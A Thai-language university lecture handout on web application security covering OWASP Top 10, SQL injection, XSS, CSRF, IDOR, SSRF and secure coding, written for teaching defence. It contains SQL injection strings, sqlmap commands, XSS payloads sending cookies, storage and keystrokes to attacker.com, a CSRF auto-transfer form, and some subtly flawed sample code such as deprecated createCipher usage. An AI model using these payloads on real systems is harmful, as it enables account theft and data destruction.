# สัปดาห์ที่ 7: การรักษาความปลอดภัยเว็บแอปพลิเคชัน
## Web Application Security

**หลักสูตร:** วิศวกรรมซอฟแวร์ปี 3  
**จำนวนชั่วโมงการเรียน:** 3 ชั่วโมง  
**วัตถุประสงค์:** นักศึกษาสามารถเข้าใจและประยุกต์ใช้หลักการรักษาความปลอดภัยเว็บแอปพลิเคชันได้อย่างมีประสิทธิภาพ

---

## สารบัญ
1. [บทนำสู่ความปลอดภัยเว็บแอปพลิเคชัน](#introduction)
2. [OWASP Top 10 Web Application Security Risks](#owasp-top10)
3. [SQL Injection และการป้องกัน](#sql-injection)
4. [Cross-Site Scripting (XSS)](#xss)
5. [การป้องกันช่องโหว่เว็บแอปพลิเคชัน](#vulnerability-protection)
6. [Secure Coding Practices](#secure-coding)
7. [กรณีศึกษาและแบบฝึกหัด](#case-studies)

---

## 1. บทนำสู่ความปลอดภัยเว็บแอปพลิเคชัน {#introduction}

### ความสำคัญของความปลอดภัยเว็บแอปพลิเคชัน

ในยุคดิจิทัล เว็บแอปพลิเคชันได้กลายเป็นส่วนสำคัญของชีวิตประจำวัน ตั้งแต่ระบบธนาคารออนไลน์ สื่อสังคมออนไลน์ ไปจนถึงระบบการจัดการองค์กร การรักษาความปลอดภัยจึงมีความสำคัญอย่างยิ่ง

### สถิติความปลอดภัยเว็บแอปพลิเคชัน

- **43%** ของการโจมตีทางไซเบอร์เป็นการโจมตีเว็บแอปพลิเคชัน
- **94%** ของระบบมีช่องโหว่ด้านความปลอดภัย
- การโจมตี Web Application เพิ่มขึ้น **300%** ในปี 2024

### ผลกระทบจากช่องโหว่ด้านความปลอดภัย

**ผลกระทบต่อองค์กร:**
- การสูญเสียข้อมูลลูกค้า (Data Breach)
- ความเสียหายต่อชื่อเสียง
- การสูญเสียทางการเงิน
- การถูกฟ้องร้องทางกฎหมาย

**ผลกระทบต่อผู้ใช้งาน:**
- การสูญเสียข้อมูลส่วนตัว
- การถูกขโมยข้อมูลทางการเงิน
- การถูก Identity Theft

---

## 2. OWASP Top 10 Web Application Security Risks {#owasp-top10}

OWASP (Open Web Application Security Project) เป็นองค์กรที่จัดอันดับความเสี่ยงด้านความปลอดภัยเว็บแอปพลิเคชันที่สำคัญที่สุด

### OWASP Top 10 (2021 Edition)

#### A01:2021 - Broken Access Control
**คำอธิบาย:** การควบคุมการเข้าถึงข้อมูลไม่ถูกต้อง ทำให้ผู้ใช้สามารถเข้าถึงข้อมูลหรือฟังก์ชันที่ไม่ได้รับอนุญาต

**ตัวอย่าง:**
```javascript
// โค้ดที่มีช่องโหว่
app.get('/admin/users/:id', (req, res) => {
    // ไม่มีการตรวจสอบสิทธิ์
    const user = database.getUser(req.params.id);
    res.json(user);
});

// โค้ดที่ปลอดภัย
app.get('/admin/users/:id', authenticateAdmin, (req, res) => {
    // ตรวจสอบสิทธิ์แอดมิน
    if (!req.user.isAdmin) {
        return res.status(403).json({error: 'Access denied'});
    }
    const user = database.getUser(req.params.id);
    res.json(user);
});
```

#### A02:2021 - Cryptographic Failures
**คำอธิบาย:** การเข้ารหัสข้อมูลไม่ถูกต้องหรือไม่เพียงพอ

**ตัวอย่างการป้องกัน:**
```javascript
const bcrypt = require('bcrypt');
const crypto = require('crypto');

// การเข้ารหัสรหัสผ่าน
async function hashPassword(password) {
    const saltRounds = 12;
    return await bcrypt.hash(password, saltRounds);
}

// การเข้ารหัสข้อมูลสำคัญ
function encryptSensitiveData(data) {
    const key = crypto.randomBytes(32);
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipher('aes-256-cbc', key, iv);
    
    let encrypted = cipher.update(data, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return {encrypted, key, iv};
}
```

#### A03:2021 - Injection
**คำอธิบาย:** การแทรกโค้ดที่เป็นอันตราย เช่น SQL Injection, NoSQL Injection, Command Injection

#### A04:2021 - Insecure Design
**คำอธิบาย:** การออกแบบระบบที่ไม่คำนึงถึงความปลอดภัย

#### A05:2021 - Security Misconfiguration
**คำอธิบาย:** การตั้งค่าความปลอดภัยไม่ถูกต้อง

**ตัวอย่างการตั้งค่าที่ปลอดภัย:**
```javascript
// การตั้งค่า HTTP Security Headers
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            scriptSrc: ["'self'"],
            imgSrc: ["'self'", "data:", "https:"]
        }
    },
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    }
}));

// การตั้งค่า CORS
app.use(cors({
    origin: ['https://yourdomain.com'],
    credentials: true,
    optionsSuccessStatus: 200
}));
```

#### A06:2021 - Vulnerable and Outdated Components
**คำอธิบาย:** การใช้ Library หรือ Framework ที่มีช่องโหว่หรือล้าสมัย

#### A07:2021 - Identification and Authentication Failures
**คำอธิบาย:** ปัญหาเกี่ยวกับการยืนยันตัวตนและการตรวจสอบสิทธิ์

#### A08:2021 - Software and Data Integrity Failures
**คำอธิบาย:** การขาดการตรวจสอบความถูกต้องของซอฟต์แวร์และข้อมูล

#### A09:2021 - Security Logging and Monitoring Failures
**คำอธิบาย:** การขาดการบันทึก Log และการตรวจสอบความปลอดภัย

#### A10:2021 - Server-Side Request Forgery (SSRF)
**คำอธิบาย:** การปลอมแปลง Request จากฝั่ง Server

---

## 3. SQL Injection และการป้องกัน {#sql-injection}

### ความเป็นมาของ SQL Injection

SQL Injection เป็นการโจมตีที่ผู้ไม่ประสงค์ดีแทรกโค้ด SQL ที่เป็นอันตรายลงในแอปพลิเคชัน เพื่อเข้าถึงหรือดัดแปลงข้อมูลในฐานข้อมูล

### กลไกการทำงานของ SQL Injection

1. **ผู้โจมตีค้นหาช่องโหว่** ในฟอร์มหรือ URL Parameter
2. **แทรกโค้ด SQL** ที่เป็นอันตราย
3. **แอปพลิเคชันประมวลผล** โค้ดที่แทรกเข้ามา
4. **เข้าถึงหรือแก้ไขข้อมูล** ในฐานข้อมูล

### ประเภทของ SQL Injection

#### 1. Classic SQL Injection
```sql
-- Input ที่เป็นอันตราย
admin'; DROP TABLE users; --

-- Query ที่ถูกสร้างขึ้น
SELECT * FROM users WHERE username='admin'; DROP TABLE users; --'
```

#### 2. Union-based SQL Injection
```sql
-- Input ที่เป็นอันตราย
1' UNION SELECT username, password FROM admin_users; --

-- Query ที่ถูกสร้างขึ้น
SELECT * FROM products WHERE id='1' UNION SELECT username, password FROM admin_users; --'
```

#### 3. Blind SQL Injection
```sql
-- Boolean-based Blind SQL Injection
1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0; --

-- Time-based Blind SQL Injection
1'; IF((SELECT COUNT(*) FROM users WHERE username='admin')>0) WAITFOR DELAY '00:00:05'; --
```

### ตัวอย่างโค้ดที่มีช่องโหว่ SQL Injection

```python
# Python - โค้ดที่มีช่องโหว่
def login(username, password):
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    cursor.execute(query)
    return cursor.fetchone()

# ถ้าผู้ใช้ใส่: admin'; --
# Query จะกลายเป็น: SELECT * FROM users WHERE username='admin'; --' AND password=''
```

```javascript
// Node.js - โค้ดที่มีช่องโหว่
app.get('/user/:id', (req, res) => {
    const query = `SELECT * FROM users WHERE id = ${req.params.id}`;
    connection.query(query, (error, results) => {
        res.json(results);
    });
});
```

```php
// PHP - โค้ดที่มีช่องโหว่
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($connection, $query);
```

### การป้องกัน SQL Injection

#### 1. Prepared Statements (Parameterized Queries)
```python
# Python - การใช้ Prepared Statement
def login_safe(username, password):
    query = "SELECT * FROM users WHERE username=%s AND password=%s"
    cursor.execute(query, (username, password))
    return cursor.fetchone()
```

```javascript
// Node.js - การใช้ Prepared Statement
app.get('/user/:id', (req, res) => {
    const query = 'SELECT * FROM users WHERE id = ?';
    connection.query(query, [req.params.id], (error, results) => {
        if (error) return res.status(500).json({error: 'Database error'});
        res.json(results);
    });
});
```

```php
// PHP - การใช้ Prepared Statement
$stmt = $connection->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

#### 2. Input Validation และ Sanitization
```javascript
// การตรวจสอบ Input
function validateInput(input) {
    // ตรวจสอบรูปแบบ
    const sqlPattern = /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER)\b)/i;
    if (sqlPattern.test(input)) {
        throw new Error('Invalid input detected');
    }
    
    // จำกัดความยาว
    if (input.length > 100) {
        throw new Error('Input too long');
    }
    
    // ลบอักขระพิเศษ
    return input.replace(/['"\\]/g, '');
}

// การใช้งาน
app.post('/login', (req, res) => {
    try {
        const username = validateInput(req.body.username);
        const password = validateInput(req.body.password);
        // ดำเนินการ login ต่อ
    } catch (error) {
        return res.status(400).json({error: error.message});
    }
});
```

#### 3. การใช้ ORM (Object-Relational Mapping)
```javascript
// Sequelize ORM - ป้องกัน SQL Injection โดยอัตโนมัติ
const { User } = require('./models');

// การค้นหาข้อมูลที่ปลอดภัย
const findUserById = async (id) => {
    return await User.findByPk(id);
};

// การค้นหาแบบมีเงื่อนไข
const findUserByCredentials = async (username, password) => {
    return await User.findOne({
        where: {
            username: username,
            password: password
        }
    });
};
```

#### 4. การใช้ Stored Procedures
```sql
-- การสร้าง Stored Procedure
DELIMITER //
CREATE PROCEDURE GetUserById(IN user_id INT)
BEGIN
    SELECT * FROM users WHERE id = user_id;
END //
DELIMITER ;

-- การเรียกใช้งาน
CALL GetUserById(123);
```

### การทดสอบ SQL Injection

#### 1. Manual Testing
```bash
# ทดสอบ Basic SQL Injection
' OR '1'='1
' OR 1=1; --
admin'; --
' UNION SELECT 1,2,3; --

# ทดสอบ Blind SQL Injection
' AND (SELECT SUBSTRING(@@version,1,1))='5'; --
' AND (SELECT COUNT(*) FROM information_schema.tables)>100; --
```

#### 2. การใช้เครื่องมือทดสอบ
```bash
# SQLMap - เครื่องมือทดสอบ SQL Injection
sqlmap -u "http://example.com/login.php" --data="username=admin&password=admin" --dbs

# การทดสอบ GET Parameter
sqlmap -u "http://example.com/product.php?id=1" --dbs

# การทดสอบแบบ Blind
sqlmap -u "http://example.com/search.php?q=test" --technique=B --dbs
```

---

## 4. Cross-Site Scripting (XSS) {#xss}

### ความเป็นมาของ Cross-Site Scripting

XSS เป็นการโจมตีที่ผู้ไม่ประสงค์ดีแทรกโค้ด JavaScript ที่เป็นอันตรายลงในเว็บไซต์ เพื่อขโมยข้อมูลจากผู้ใช้หรือดำเนินการในนามของผู้ใช้

### ประเภทของ XSS

#### 1. Stored XSS (Persistent XSS)
โค้ดที่เป็นอันตรายถูกเก็บไว้ในฐานข้อมูลและแสดงผลให้ผู้ใช้ทุกครั้งที่เข้าชม

**ตัวอย่าง:**
```html
<!-- ความคิดเห็นที่มี XSS Payload -->
<div class="comment">
    <script>
        // ขโมย Cookie
        document.location='http://attacker.com/steal.php?cookie='+document.cookie;
    </script>
</div>
```

#### 2. Reflected XSS (Non-Persistent XSS)
โค้ดที่เป็นอันตรายถูกส่งกลับมาจาก Server ในการตอบกลับ

**ตัวอย่าง:**
```html
<!-- URL: http://example.com/search?q=<script>alert('XSS')</script> -->
<div class="search-result">
    ผลการค้นหาสำหรับ: <script>alert('XSS')</script>
</div>
```

#### 3. DOM-based XSS
การโจมตีที่เกิดขึ้นจากการจัดการ DOM ฝั่ง Client

**ตัวอย่าง:**
```html
<script>
// โค้ดที่มีช่องโหว่
var search = new URLSearchParams(window.location.search).get('search');
document.getElementById('result').innerHTML = 'คุณค้นหา: ' + search;

// URL: http://example.com?search=<img src=x onerror=alert('XSS')>
</script>
```

### ตัวอย่าง XSS Payload

```javascript
// การขโมย Cookie
<script>
    fetch('http://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify({cookie: document.cookie})
    });
</script>

// การขโมยข้อมูล Session Storage
<script>
    var data = {
        sessionStorage: JSON.stringify(sessionStorage),
        localStorage: JSON.stringify(localStorage)
    };
    fetch('http://attacker.com/data', {
        method: 'POST',
        body: JSON.stringify(data)
    });
</script>

// การ Redirect ไปยังเว็บไซต์ปลอม
<script>
    setTimeout(() => {
        window.location = 'http://fake-bank.com/login';
    }, 3000);
</script>

// Keylogger
<script>
    document.addEventListener('keypress', function(e) {
        fetch('http://attacker.com/keys', {
            method: 'POST',
            body: String.fromCharCode(e.charCode)
        });
    });
</script>
```

### การป้องกัน XSS

#### 1. Input Validation และ Sanitization
```javascript
// การตรวจสอบ Input
function validateInput(input) {
    // ลบ HTML Tags
    const cleaned = input.replace(/<[^>]*>/g, '');
    
    // ลบ JavaScript Events
    const sanitized = cleaned.replace(/on\w+="[^"]*"/gi, '');
    
    return sanitized;
}

// การใช้ Library สำหรับ Sanitization
const DOMPurify = require('dompurify');

function sanitizeHTML(dirty) {
    return DOMPurify.sanitize(dirty);
}
```

#### 2. Output Encoding
```javascript
// HTML Encoding
function htmlEncode(str) {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/\//g, '&#x2F;');
}

// JavaScript Encoding
function jsEncode(str) {
    return str
        .replace(/\\/g, '\\\\')
        .replace(/'/g, '\\\'')
        .replace(/"/g, '\\"')
        .replace(/\n/g, '\\n')
        .replace(/\r/g, '\\r')
        .replace(/\t/g, '\\t');
}

// การใช้งาน
app.get('/profile', (req, res) => {
    const username = htmlEncode(req.user.username);
    res.render('profile', { username: username });
});
```

#### 3. Content Security Policy (CSP)
```javascript
// การตั้งค่า CSP Header
app.use((req, res, next) => {
    res.setHeader('Content-Security-Policy', 
        "default-src 'self'; " +
        "script-src 'self' 'unsafe-inline' https://trusted-cdn.com; " +
        "style-src 'self' 'unsafe-inline'; " +
        "img-src 'self' data: https:; " +
        "font-src 'self' https://fonts.googleapis.com; " +
        "connect-src 'self' https://api.example.com"
    );
    next();
});
```

```html
<!-- CSP ใน HTML Meta Tag -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'nonce-randomvalue'">

<!-- การใช้ Nonce -->
<script nonce="randomvalue">
    // JavaScript ที่ปลอดภัย
</script>
```

#### 4. การใช้ Template Engine ที่มีการ Escape อัตโนมัติ
```html
<!-- Handlebars - Auto-escape -->
<div>{{username}}</div> <!-- ปลอดภัย -->
<div>{{{username}}}</div> <!-- ไม่ปลอดภัย -->

<!-- EJS - Auto-escape -->
<div><%- username %></div> <!-- ไม่ปลอดภัย -->
<div><%= username %></div> <!-- ปลอดภัย -->
```

#### 5. HTTP-Only Cookies
```javascript
// การตั้งค่า Cookie ที่ปลอดภัย
app.use(session({
    secret: 'your-secret-key',
    cookie: {
        httpOnly: true,    // ป้องกัน JavaScript เข้าถึง
        secure: true,      // ใช้เฉพาะ HTTPS
        sameSite: 'strict' // ป้องกัน CSRF
    }
}));

// การตั้งค่า Cookie ด้วยตนเอง
res.cookie('sessionId', sessionId, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    maxAge: 24 * 60 * 60 * 1000, // 24 ชั่วโมง
    sameSite: 'strict'
});
```

---

## 5. การป้องกันช่องโหว่เว็บแอปพลิเคชัน {#vulnerability-protection}

### Cross-Site Request Forgery (CSRF)

CSRF เป็นการโจมตีที่บังคับให้ผู้ใช้ดำเนินการที่ไม่ต้องการในเว็บแอปพลิเคชันที่พวกเขาได้รับการตรวจสอบสิทธิ์แล้ว

#### ตัวอย่างการโจมตี CSRF
```html
<!-- เว็บไซต์ของผู้โจมตี -->
<img src="http://bank.com/transfer?to=attacker&amount=1000000" style="display:none">

<!-- หรือแบบ POST -->
<form action="http://bank.com/transfer" method="POST" id="maliciousForm" style="display:none">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000000">
</form>
<script>document.getElementById('maliciousForm').submit();</script>
```

#### การป้องกัน CSRF
```javascript
// การใช้ CSRF Token
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.use(csrfProtection);

app.get('/transfer', (req, res) => {
    res.render('transfer', { 
        csrfToken: req.csrfToken() 
    });
});

app.post('/transfer', (req, res) => {
    // CSRF Token จะถูกตรวจสอบอัตโนมัติ
    // ดำเนินการโอนเงิน
});
```

```html
<!-- HTML Form พร้อม CSRF Token -->
<form action="/transfer" method="POST">
    <input type="hidden" name="_csrf" value="{{csrfToken}}">
    <input type="text" name="to" placeholder="ผู้รับ">
    <input type="number" name="amount" placeholder="จำนวนเงิน">
    <button type="submit">โอนเงิน</button>
</form>
```

### Insecure Direct Object References (IDOR)

IDOR เกิดขึ้นเมื่อแอปพลิเคชันให้การเข้าถึงออบเจ็กต์โดยอิงจาก Input ที่ผู้ใช้ควบคุมได้

#### ตัวอย่างช่องโหว่ IDOR
```javascript
// โค้ดที่มีช่องโหว่
app.get('/profile/:userId', (req, res) => {
    // ไม่มีการตรวจสอบสิทธิ์
    const user = database.getUser(req.params.userId);
    res.json(user);
});

// ผู้ใช้สามารถเปลี่ยน URL เป็น /profile/1, /profile/2, etc.
```

#### การป้องกัน IDOR
```javascript
// การตรวจสอบสิทธิ์การเข้าถึง
app.get('/profile/:userId', authenticateUser, (req, res) => {
    const requestedUserId = parseInt(req.params.userId);
    const currentUserId = req.user.id;
    
    // ตรวจสอบว่าผู้ใช้เป็นเจ้าของข้อมูลหรือมีสิทธิ์
    if (requestedUserId !== currentUserId && !req.user.isAdmin) {
        return res.status(403).json({
            error: 'คุณไม่มีสิทธิ์เข้าถึงข้อมูลนี้'
        });
    }
    
    const user = database.getUser(requestedUserId);
    res.json(user);
});

// การใช้ UUID แทน Sequential ID
const { v4: uuidv4 } = require('uuid');

// สร้าง UUID สำหรับผู้ใช้ใหม่
const newUser = {
    id: uuidv4(), // เช่น: '9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d'
    username: 'john_doe',
    email: 'john@example.com'
};
```

### Server-Side Request Forgery (SSRF)

SSRF เป็นการโจมตีที่ผู้โจมตีสามารถบังคับให้ Server ส่ง Request ไปยัง URL ที่ผู้โจมตีระบุ

#### ตัวอย่างช่องโหว่ SSRF
```javascript
// โค้ดที่มีช่องโหว่
app.get('/fetch-url', (req, res) => {
    const url = req.query.url;
    // ไม่มีการตรวจสอบ URL
    fetch(url)
        .then(response => response.text())
        .then(data => res.send(data))
        .catch(err => res.status(500).send('Error'));
});

// ผู้โจมตีสามารถใส่: http://localhost:3000/admin
// หรือ: file:///etc/passwd
```

#### การป้องกัน SSRF
```javascript
const url = require('url');
const net = require('net');

function isValidURL(inputURL) {
    try {
        const parsed = new URL(inputURL);
        
        // อนุญาตเฉพาะ HTTP/HTTPS
        if (!['http:', 'https:'].includes(parsed.protocol)) {
            return false;
        }
        
        // ตรวจสอบ IP Address
        const hostname = parsed.hostname;
        
        // ปฏิเสธ Private IP ranges
        const privateRanges = [
            /^127\./, // localhost
            /^10\./, // Class A private
            /^172\.(1[6-9]|2[0-9]|3[01])\./, // Class B private
            /^192\.168\./, // Class C private
            /^::1$/, // IPv6 localhost
            /^fc00:/, // IPv6 private
        ];
        
        if (privateRanges.some(range => range.test(hostname))) {
            return false;
        }
        
        return true;
    } catch {
        return false;
    }
}

app.get('/fetch-url', (req, res) => {
    const inputURL = req.query.url;
    
    if (!isValidURL(inputURL)) {
        return res.status(400).json({
            error: 'URL ไม่ถูกต้องหรือไม่อนุญาต'
        });
    }
    
    // Whitelist ของ Domain ที่อนุญาต
    const allowedDomains = ['api.example.com', 'cdn.example.com'];
    const parsed = new URL(inputURL);
    
    if (!allowedDomains.includes(parsed.hostname)) {
        return res.status(403).json({
            error: 'Domain ไม่ได้รับอนุญาต'
        });
    }
    
    fetch(inputURL, {
        timeout: 5000, // กำหนด Timeout
        headers: {
            'User-Agent': 'MyApp/1.0'
        }
    })
    .then(response => response.text())
    .then(data => res.send(data))
    .catch(err => res.status(500).send('Error fetching URL'));
});
```

### File Upload Vulnerabilities

การอัปโหลดไฟล์ที่ไม่ปลอดภัยสามารถนำไปสู่การโจมตีได้หลายรูปแบบ

#### ตัวอย่างการป้องกัน File Upload
```javascript
const multer = require('multer');
const path = require('path');
const crypto = require('crypto');

// การตั้งค่า Multer ที่ปลอดภัย
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, 'uploads/') // โฟลเดอร์ที่ปลอดภัย
    },
    filename: function (req, file, cb) {
        // สร้างชื่อไฟล์ใหม่เพื่อป้องกันการชน
        const hash = crypto.randomBytes(16).toString('hex');
        const ext = path.extname(file.originalname).toLowerCase();
        cb(null, hash + ext);
    }
});

// ตรวจสอบประเภทไฟล์
const fileFilter = (req, file, cb) => {
    // อนุญาตเฉพาะไฟล์รูปภาพ
    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
    const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif'];
    
    const ext = path.extname(file.originalname).toLowerCase();
    
    if (allowedTypes.includes(file.mimetype) && allowedExtensions.includes(ext)) {
        cb(null, true);
    } else {
        cb(new Error('ประเภทไฟล์ไม่ได้รับอนุญาต'), false);
    }
};

const upload = multer({
    storage: storage,
    fileFilter: fileFilter,
    limits: {
        fileSize: 5 * 1024 * 1024, // จำกัดขนาด 5MB
        files: 1 // อนุญาต 1 ไฟล์ต่อครั้ง
    }
});

app.post('/upload', upload.single('image'), (req, res) => {
    if (!req.file) {
        return res.status(400).json({ error: 'ไม่พบไฟล์' });
    }
    
    // ตรวจสอบ Magic Number (File Signature)
    const fs = require('fs');
    const fileBuffer = fs.readFileSync(req.file.path);
    
    const jpegSignature = [0xFF, 0xD8, 0xFF];
    const pngSignature = [0x89, 0x50, 0x4E, 0x47];
    
    const isValidJpeg = jpegSignature.every((byte, index) => 
        fileBuffer[index] === byte);
    const isValidPng = pngSignature.every((byte, index) => 
        fileBuffer[index] === byte);
    
    if (!isValidJpeg && !isValidPng) {
        fs.unlinkSync(req.file.path); // ลบไฟล์
        return res.status(400).json({ error: 'ไฟล์ไม่ถูกต้อง' });
    }
    
    res.json({
        message: 'อัปโหลดสำเร็จ',
        filename: req.file.filename
    });
});
```

---

## 6. Secure Coding Practices {#secure-coding}

### หลักการพื้นฐานของ Secure Coding

#### 1. Principle of Least Privilege
ให้สิทธิ์เฉพาะที่จำเป็นต่อการทำงาน

```javascript
// การจัดการสิทธิ์ผู้ใช้
const roles = {
    ADMIN: ['read', 'write', 'delete', 'manage_users'],
    USER: ['read', 'write_own'],
    GUEST: ['read']
};

function hasPermission(user, action, resource) {
    const userRoles = user.roles || [];
    
    return userRoles.some(role => {
        const permissions = roles[role] || [];
        
        // ตรวจสอบสิทธิ์พื้นฐาน
        if (permissions.includes(action)) {
            // ตรวจสอบเพิ่มเติมสำหรับ Resource ที่เป็นของตนเอง
            if (action === 'write_own') {
                return resource.ownerId === user.id;
            }
            return true;
        }
        return false;
    });
}

// Middleware สำหรับตรวจสอบสิทธิ์
function requirePermission(action) {
    return (req, res, next) => {
        const user = req.user;
        const resource = req.resource;
        
        if (!hasPermission(user, action, resource)) {
            return res.status(403).json({
                error: 'ไม่มีสิทธิ์ในการดำเนินการนี้'
            });
        }
        next();
    };
}
```

#### 2. Defense in Depth
การใช้หลายชั้นการป้องกัน

```javascript
// การใช้หลายชั้นการป้องกัน
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');

// ชั้นที่ 1: Rate Limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 นาที
    max: 100 // จำกัด 100 request ต่อ IP
});

// ชั้นที่ 2: Security Headers
app.use(helmet());

// ชั้นที่ 3: Input Validation
const { body, validationResult } = require('express-validator');

// ชั้นที่ 4: Authentication
function authenticateToken(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    
    if (!token) {
        return res.sendStatus(401);
    }
    
    jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
        if (err) return res.sendStatus(403);
        req.user = user;
        next();
    });
}

// การใช้งานทั้งหมด
app.use(limiter);
app.post('/api/users',
    authenticateToken,
    [
        body('email').isEmail().normalizeEmail(),
        body('password').isLength({ min: 8 }).matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/)
    ],
    (req, res) => {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({ errors: errors.array() });
        }
        
        // ดำเนินการต่อ...
    }
);
```

#### 3. Fail Secure
ระบบควรล้มเหลวในสถานะที่ปลอดภัย

```javascript
function getUserData(userId, requesterUserId) {
    try {
        // ตรวจสอบสิทธิ์ก่อน
        if (!canAccessUserData(userId, requesterUserId)) {
            // Fail Secure: ปฏิเสธการเข้าถึงเมื่อไม่แน่ใจ
            throw new Error('Access denied');
        }
        
        const userData = database.getUser(userId);
        
        if (!userData) {
            // Fail Secure: ไม่เปิดเผยว่าผู้ใช้มีอยู่หรือไม่
            throw new Error('User not found');
        }
        
        return userData;
    } catch (error) {
        // Fail Secure: Log error แต่ไม่เปิดเผยรายละเอียด
        logger.error(`getUserData failed: ${error.message}`, {
            userId,
            requesterUserId,
            timestamp: new Date()
        });
        
        // ส่งกลับข้อความทั่วไป
        throw new Error('Unable to retrieve user data');
    }
}
```

### การจัดการ Authentication และ Authorization

#### 1. Password Security
```javascript
const bcrypt = require('bcrypt');
const zxcvbn = require('zxcvbn'); // ตรวจสอบความแข็งแรงของรหัสผ่าน

async function hashPassword(password) {
    // ตรวจสอบความแข็งแรงของรหัสผ่าน
    const strength = zxcvbn(password);
    if (strength.score < 3) {
        throw new Error('รหัสผ่านไม่แข็งแรงเพียงพอ');
    }
    
    const saltRounds = 12;
    return await bcrypt.hash(password, saltRounds);
}

async function verifyPassword(password, hashedPassword) {
    return await bcrypt.compare(password, hashedPassword);
}

// การป้องกัน Timing Attack
async function safeVerifyPassword(password, hashedPassword) {
    const dummyHash = '$2b$12$dummyhashtopreventtimingattack';
    
    if (!hashedPassword) {
        // ทำ dummy comparison เพื่อป้องกัน timing attack
        await bcrypt.compare(password, dummyHash);
        return false;
    }
    
    return await bcrypt.compare(password, hashedPassword);
}
```

#### 2. JWT Token Security
```javascript
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

class TokenManager {
    constructor() {
        this.revokedTokens = new Set(); // ใช้ Redis ในการผลิตจริง
    }
    
    generateTokens(user) {
        const payload = {
            userId: user.id,
            email: user.email,
            roles: user.roles
        };
        
        // Access Token (อายุสั้น)
        const accessToken = jwt.sign(payload, process.env.JWT_SECRET, {
            expiresIn: '15m',
            issuer: 'myapp',
            audience: 'myapp-users',
            jwtid: crypto.randomUUID()
        });
        
        // Refresh Token (อายุยาว)
        const refreshToken = jwt.sign(
            { userId: user.id, tokenType: 'refresh' },
            process.env.REFRESH_TOKEN_SECRET,
            { expiresIn: '7d' }
        );
        
        return { accessToken, refreshToken };
    }
    
    verifyAccessToken(token) {
        try {
            // ตรวจสอบว่า token ถูก revoke หรือไม่
            if (this.revokedTokens.has(token)) {
                throw new Error('Token has been revoked');
            }
            
            const decoded = jwt.verify(token, process.env.JWT_SECRET, {
                issuer: 'myapp',
                audience: 'myapp-users'
            });
            
            return decoded;
        } catch (error) {
            throw new Error('Invalid or expired token');
        }
    }
    
    revokeToken(token) {
        this.revokedTokens.add(token);
        // ใน production ควร set TTL ใน Redis
    }
}
```

#### 3. Session Management
```javascript
const session = require('express-session');
const MongoStore = require('connect-mongo');

app.use(session({
    secret: process.env.SESSION_SECRET,
    name: 'sessionId', // เปลี่ยนชื่อจาก default
    resave: false,
    saveUninitialized: false,
    store: MongoStore.create({
        mongoUrl: process.env.MONGODB_URI
    }),
    cookie: {
        secure: process.env.NODE_ENV === 'production', // HTTPS only in production
        httpOnly: true, // ป้องกัน XSS
        maxAge: 30 * 60 * 1000, // 30 นาที
        sameSite: 'strict' // ป้องกัน CSRF
    },
    rolling: true // รีเซ็ต expiration ทุกครั้งที่ใช้งาน
}));

// Session Fixation Protection
app.use((req, res, next) => {
    if (req.session && !req.session.regenerated) {
        req.session.regenerate((err) => {
            if (err) {
                return next(err);
            }
            req.session.regenerated = true;
            next();
        });
    } else {
        next();
    }
});
```

### การใช้ HTTPS และ TLS

```javascript
const express = require('express');
const https = require('https');
const fs = require('fs');

// การบังคับใช้ HTTPS
app.use((req, res, next) => {
    if (req.header('x-forwarded-proto') !== 'https') {
        res.redirect(`https://${req.header('host')}${req.url}`);
    } else {
        next();
    }
});

// การตั้งค่า HSTS
app.use((req, res, next) => {
    res.setHeader('Strict-Transport-Security', 
        'max-age=31536000; includeSubDomains; preload');
    next();
});

// การตั้งค่า SSL/TLS
const options = {
    key: fs.readFileSync('path/to/private-key.pem'),
    cert: fs.readFileSync('path/to/certificate.pem'),
    // การตั้งค่า TLS ที่แข็งแรง
    secureProtocol: 'TLSv1_2_method',
    ciphers: [
        'ECDHE-RSA-AES128-GCM-SHA256',
        'ECDHE-RSA-AES256-GCM-SHA384',
        'ECDHE-RSA-AES128-SHA256',
        'ECDHE-RSA-AES256-SHA384'
    ].join(':'),
    honorCipherOrder: true
};

https.createServer(options, app).listen(443, () => {
    console.log('HTTPS Server running on port 443');
});
```

### Error Handling และ Logging

```javascript
const winston = require('winston');

// การตั้งค่า Logger
const logger = winston.createLogger({
    level: 'info',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.errors({ stack: true }),
        winston.format.json()
    ),
    transports: [
        new winston.transports.File({ 
            filename: 'error.log', 
            level: 'error' 
        }),
        new winston.transports.File({ 
            filename: 'combined.log' 
        })
    ]
});

// Security Event Logging
function logSecurityEvent(event, details) {
    logger.warn('Security Event', {
        event,
        details,
        timestamp: new Date(),
        severity: 'high'
    });
}

